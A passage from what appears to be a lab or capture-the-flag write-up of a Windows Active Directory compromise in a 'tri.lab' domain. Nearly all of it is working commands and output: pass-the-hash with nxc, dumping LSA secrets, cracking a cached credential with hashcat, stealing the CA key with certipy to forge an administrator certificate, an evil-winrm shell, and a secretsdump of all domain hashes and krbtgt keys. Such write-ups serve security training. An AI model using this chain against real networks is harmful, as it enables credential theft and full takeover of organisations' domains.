[*] smb://TRI/E.ACKERLUND@bike-srv [7] -> Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9a6434f863c1835d5f1baf39a544ad57:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9a6434f863c1835d5f1baf39a544ad57:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9a6434f863c1835d5f1baf39a544ad57:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```
So with the .lnk file still in the share ill relay it to BIKE-SRV and get the administrator hash

```python
nxc smb BIKE-SRV.tri.lab -u administrator -H '9a6434f863c1835d5f1baf39a544ad57' --local-auth
SMB         10.1.243.198    445    BIKE-SRV         [*] Windows Server 2022 Build 20348 x64 (name:BIKE-SRV) (domain:BIKE-SRV) (signing:False) (SMBv1:None)
SMB         10.1.243.198    445    BIKE-SRV         [+] BIKE-SRV\administrator:9a6434f863c1835d5f1baf39a544ad57 (Pwn3d!)
```
This system has now been full compromised
# Compromising `m.pearson`
```python
nxc smb BIKE-SRV.tri.lab -u administrator -H '9a6434f863c1835d5f1baf39a544ad57' --local-auth --lsa            
SMB         10.1.243.198    445    BIKE-SRV         [*] Windows Server 2022 Build 20348 x64 (name:BIKE-SRV) (domain:BIKE-SRV) (signing:False) (SMBv1:None)
SMB         10.1.243.198    445    BIKE-SRV         [+] BIKE-SRV\administrator:9a6434f863c1835d5f1baf39a544ad57 (Pwn3d!)
SMB         10.1.243.198    445    BIKE-SRV         [*] Dumping LSA secrets
SMB         10.1.243.198    445    BIKE-SRV         TRI.LAB/Administrator:$DCC2$10240#Administrator#9ba54f4ea00cab3cd7afc83b1a2ee62d: (2025-10-03 22:30:08)
SMB         10.1.243.198    445    BIKE-SRV         TRI.LAB/m.pearson:$DCC2$10240#m.pearson#05b458fcb2ebb0869a4979097a6bedaa: (2025-10-06 05:25:20)
SMB         10.1.243.198    445    BIKE-SRV         TRI\BIKE-SRV$:aes256-cts-hmac-sha1-96:fa84169c6aa92731ce6331c73168712a84f58cfff902d39290c811b360cffbec
SMB         10.1.243.198    445    BIKE-SRV         TRI\BIKE-SRV$:aes128-cts-hmac-sha1-96:678fbdf418104091cdbec1c4199e2da0
SMB         10.1.243.198    445    BIKE-SRV         TRI\BIKE-SRV$:des-cbc-md5:2a2f4fab80974ccb
SMB         10.1.243.198    445    BIKE-SRV         TRI\BIKE-SRV$:plain_password_hex:0804c93b62cc889296884e801e2e90d643fc1b72292f3c94f721a6a16ea23a334df8381e1331751b37bf0504c2b0f334902b1b1c8e07389ad222906db00a77b33c595428d2ae40d959ab6106902d72299ff8e6fc78dc565061ebe5fd0506fb47a3777351292e3dcc66be09b800d03dfbec35917f06da9cfd7fe635479465a1b655d3078ff6c7a916d665742af7b8b01a901c54a32981d1421e0ca7f84f62660897c53ddab4bddd8ee7f64b02c97636c5411cffa102ebd8aadd8a1b6b307526b722198f4f9d2be1ef275604d47562b3e0cf7268270e1f56773b6142ce3e80380735b9b07d5e5672a3cebacb452a6150c9
SMB         10.1.243.198    445    BIKE-SRV         TRI\BIKE-SRV$:aad3b435b51404eeaad3b435b51404ee:fab53f0bbe562b55d02e6de997ff9bd9:::
SMB         10.1.243.198    445    BIKE-SRV         dpapi_machinekey:0xa2d39c0a2a834f5ffa23e290b622fa3a8a83c285
dpapi_userkey:0x7cd091235ffccf5405522a0079471092772d3b38
SMB         10.1.243.198    445    BIKE-SRV         [+] Dumped 8 LSA secrets to /home/kali/.nxc/logs/lsa/BIKE-SRV_10.1.243.198_2026-03-09_174933.secrets and /home/kali/.nxc/logs/lsa/BIKE-SRV_10.1.243.198_2026-03-09_174933.cached
```
As the administrator i can dump the lsa secrets
Now ill crack `m.pearson` hash
## Cracking the hash
```python
hashcat m-pearson.hash /usr/share/wordlists/rockyou.txt

$DCC2$10240#m.pearson#05b458fcb2ebb0869a4979097a6bedaa:2silver
```
This hash cracked

```python
m.pearson:2silver
```
Now ill verify authentication

```python
nxc ldap RUN-SRV.tri.lab -u m.pearson -p 2silver                                           
LDAP        10.1.107.4      389    RUN-SRV          [*] Windows Server 2022 Build 20348 (name:RUN-SRV) (domain:tri.lab) (signing:None) (channel binding:Never) 
LDAP        10.1.107.4      389    RUN-SRV          [+] tri.lab\m.pearson:2silver
```
This user is now compromised

```python
nxc rdp SWIM-SRV.tri.lab -u m.pearson -p 2silver
RDP         10.1.195.77     3389   SWIM-SRV         [*] Windows 10 or Windows Server 2016 Build 20348 (name:SWIM-SRV) (domain:tri.lab) (nla:True)
RDP         10.1.195.77     3389   SWIM-SRV         [+] tri.lab\m.pearson:2silver (Pwn3d!)
```
This user also has access over RDP on SWIM-SRV

# Stolen CA leads to domain admin
```python
certipy-ad ca -backup -ca 'tri-CA' -username "m.pearson@tri.lab" -password "2silver" -dc-ip "10.1.107.4" -target SWIM-SRV
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: All nameservers failed to answer the query SWIM-SRV. IN A: Server Do53:10.1.107.4@53 answered SERVFAIL
[!] Use -debug to print a stacktrace
[*] Creating new service for backup operation
[*] Creating backup
[*] Retrieving backup
[*] Got certificate and private key
[*] Backing up original PFX/P12 to 'pfx.p12'
[*] Backed up original PFX/P12 to 'pfx.p12'
[*] Saving certificate and private key to 'tri-CA.pfx'
[*] Wrote certificate and private key to 'tri-CA.pfx'
[*] Cleaning up
```

```python
certipy-ad forge -ca-pfx tri-CA.pfx -upn j.reed_adm@tri.lab -sid S-1-5-21-542797205-3952052766-1175187200-1109 -crl ldap:///
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Saving forged certificate and private key to 'j.reed_adm_forged.pfx'
[*] Wrote forged certificate and private key to 'j.reed_adm_forged.pfx'
```
This forged the administrator .pfx which i can now use to authenticate

```python
certipy-ad auth -pfx "j.reed_adm_forged.pfx" -dc-ip 10.1.107.4 -username j.reed_adm -domain tri.lab 
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'j.reed_adm@tri.lab'
[*]     SAN URL SID: 'S-1-5-21-542797205-3952052766-1175187200-1109'
[*]     Security Extension SID: 'S-1-5-21-542797205-3952052766-1175187200-1109'
[*] Using principal: 'j.reed_adm@tri.lab'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'j.reed_adm.ccache'
[*] Wrote credential cache to 'j.reed_adm.ccache'
[*] Trying to retrieve NT hash for 'j.reed_adm'
[*] Got hash for 'j.reed_adm@tri.lab': aad3b435b51404eeaad3b435b51404ee:213846abdca7279a77229f6b422263fe
```
Now ive go the NTLM hash of the administrator

```python
evil-winrm -i RUN-SRV.tri.lab -u j.reed_adm -H '213846abdca7279a77229f6b422263fe'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\j.reed_adm\Documents> cd ../../Administrator
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop>
```
Im now the administrator

```python
*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 

```
Full administrative rights

```python
secretsdump.py -hashes ':213846abdca7279a77229f6b422263fe' j.reed_adm@RUN-SRV
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x068696a3c09b87f853a9c2c8399cfbe0
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:47a7fbb0dcf9ab80dd948a4963afd0c3:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
TRI\RUN-SRV$:aes256-cts-hmac-sha1-96:c6e0d8de1fed3d131c8d3b7456b824ad668d277a0d169af10ea9442264439c3a
TRI\RUN-SRV$:aes128-cts-hmac-sha1-96:1f70087921cbd15bb5f6be46d3a317b6
TRI\RUN-SRV$:des-cbc-md5:efdfd9fe7c2c79e5
TRI\RUN-SRV$:plain_password_hex:c286e857d93c27878e67670f47b13fb08d4a8c7c1b890aa304fe1de2f238890bc7cab4a5b2199682a3ced06d5617cd6e169c03063cfb85303495759f33b3498f86785f9ad3816ca368b34fc27bc687b30ec405970098f859ae62150debafbc62d3672cb49312160823eebe04b77da2d595867c3b6234e399c3e493aa37196ea3d6d73084878b6cc21404fe5b3d4e26cfe3eee456edc589a0ab00e67d15868e002eae1894fadf9f01ba9912fc47a4cde0f4ad4cbb0ad783c171d1f817e3cc31eea27004b10a4cfd8060f3b8102b1baa3dbbda4b1e0129d47892ea54ec05180284285d3d3de463a130e58656d69cd10f6d
TRI\RUN-SRV$:aad3b435b51404eeaad3b435b51404ee:9a393c3aad5aa4571c0445df40b4ece4:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xed3adb080a04b32512a26fa060d92afd184eef0f
dpapi_userkey:0xd529b68f274e30173be4661c707acfe993488f99
[*] NL$KM 
 0000   B6 96 C7 7E 17 8A 0C DD  8C 39 C2 0A A2 91 24 44   ...~.....9....$D
 0010   A2 E4 4D C2 09 59 46 C0  7F 95 EA 11 CB 7F CB 72   ..M..YF........r
 0020   EC 2E 5A 06 01 1B 26 FE  6D A7 88 0F A5 E7 1F A5   ..Z...&.m.......
 0030   96 CD E5 3F A0 06 5E C1  A5 01 A1 CE 8C 24 76 95   ...?..^......$v.
NL$KM:b696c77e178a0cdd8c39c20aa2912444a2e44dc2095946c07f95ea11cb7fcb72ec2e5a06011b26fe6da7880fa5e71fa596cde53fa0065ec1a501a1ce8c247695
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:183d35a34c9741693912242ec48f9930:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3e51ec78e8a47ef55791dad0f752aa69:::
tri.lab\t.spivey:1103:aad3b435b51404eeaad3b435b51404ee:aaf895b31116d312a414dab0c45e0ba2:::
tri.lab\j.reed:1104:aad3b435b51404eeaad3b435b51404ee:405c3b0e8ab6887b49064708c9277caf:::
tri.lab\e.ackerlund:1105:aad3b435b51404eeaad3b435b51404ee:35393dfc46f632e8e98830ac911779bb:::
tri.lab\m.pearson:1106:aad3b435b51404eeaad3b435b51404ee:40d6f296d7a84f7a52d37b5fd8cba80a:::
tri.lab\j.reed_adm:1109:aad3b435b51404eeaad3b435b51404ee:213846abdca7279a77229f6b422263fe:::
RUN-SRV$:1000:aad3b435b51404eeaad3b435b51404ee:9a393c3aad5aa4571c0445df40b4ece4:::
BIKE-SRV$:1107:aad3b435b51404eeaad3b435b51404ee:fab53f0bbe562b55d02e6de997ff9bd9:::
SWIM-SRV$:1108:aad3b435b51404eeaad3b435b51404ee:16ba4cb72f21f0672bf5a2677e8b4c2e:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:68c66583af74db980ed81819b73483e61e4ac868f6c3914d4b970e3172b909ec
Administrator:aes128-cts-hmac-sha1-96:fd0b56826348b562f01542ad773de83b
Administrator:des-cbc-md5:d04cda80bc2aea20
krbtgt:aes256-cts-hmac-sha1-96:7cabb69c76abcd6fa80d5ff4fb13f43c08866a1276d885d57a912218524f052a
krbtgt:aes128-cts-hmac-sha1-96:41562765f40beb454a36650a1d711b8c
krbtgt:des-cbc-md5:e6b03461c46eaea8
tri.lab\t.spivey:aes256-cts-hmac-sha1-96:c554525e38a131128c4a40abaf44ece9c60d243c31450ef3348ddba94d99c2e5
tri.lab\t.spivey:aes128-cts-hmac-sha1-96:adf0de851fce0d40ae3f54fe94b5ae73
tri.lab\t.spivey:des-cbc-md5:26bac407d9c4dcc2
tri.lab\j.reed:aes256-cts-hmac-sha1-96:ed7494562374f5b38b638eda32cc9acf7afc34b7d3257a9dbc8e5d8b1b2d3f17
tri.lab\j.reed:aes128-cts-hmac-sha1-96:b280afaac60d822e2852bcf4e4a0f9b3
tri.lab\j.reed:des-cbc-md5:973864208675c137
tri.lab\e.ackerlund:aes256-cts-hmac-sha1-96:1f0be908adf5f514609b448ac15f61edacabdc1d200911eda818ba47d8cbd3f6
tri.lab\e.ackerlund:aes128-cts-hmac-sha1-96:ddc606facf541d72c1e6889ea3ea7118
tri.lab\e.ackerlund:des-cbc-md5:1023757f64bf8f70
tri.lab\m.pearson:aes256-cts-hmac-sha1-96:0c885b356b0579923b8be2dcc0df6eb43cbd911a433139d786c9892368d0b0b8
tri.lab\m.pearson:aes128-cts-hmac-sha1-96:677572e9540f6614dcda6cc88140016d
tri.lab\m.pearson:des-cbc-md5:b5b3bce667abb9ea
tri.lab\j.reed_adm:aes256-cts-hmac-sha1-96:0f7ff389a56d0455e4fed3484afd7f76df0486e2fe8f6cbfb0aaa5ebdc7dc577
tri.lab\j.reed_adm:aes128-cts-hmac-sha1-96:8455f9bf57b9bbc5089283ab459fb3c7
tri.lab\j.reed_adm:des-cbc-md5:6832dc1616eae0fb
RUN-SRV$:aes256-cts-hmac-sha1-96:c6e0d8de1fed3d131c8d3b7456b824ad668d277a0d169af10ea9442264439c3a
RUN-SRV$:aes128-cts-hmac-sha1-96:1f70087921cbd15bb5f6be46d3a317b6
RUN-SRV$:des-cbc-md5:da3140e5467c5e31
BIKE-SRV$:aes256-cts-hmac-sha1-96:fa84169c6aa92731ce6331c73168712a84f58cfff902d39290c811b360cffbec
BIKE-SRV$:aes128-cts-hmac-sha1-96:678fbdf418104091cdbec1c4199e2da0
BIKE-SRV$:des-cbc-md5:381632970b5b589b
SWIM-SRV$:aes256-cts-hmac-sha1-96:6f4986abba9f46b0aac9546967df31912f68c6de63f9217b3710b127a3e0ea44
SWIM-SRV$:aes128-cts-hmac-sha1-96:738e34d043b127a24239e769fe9206c6
SWIM-SRV$:des-cbc-md5:760b453def263491
[*] Cleaning up... 
```
Domain admin!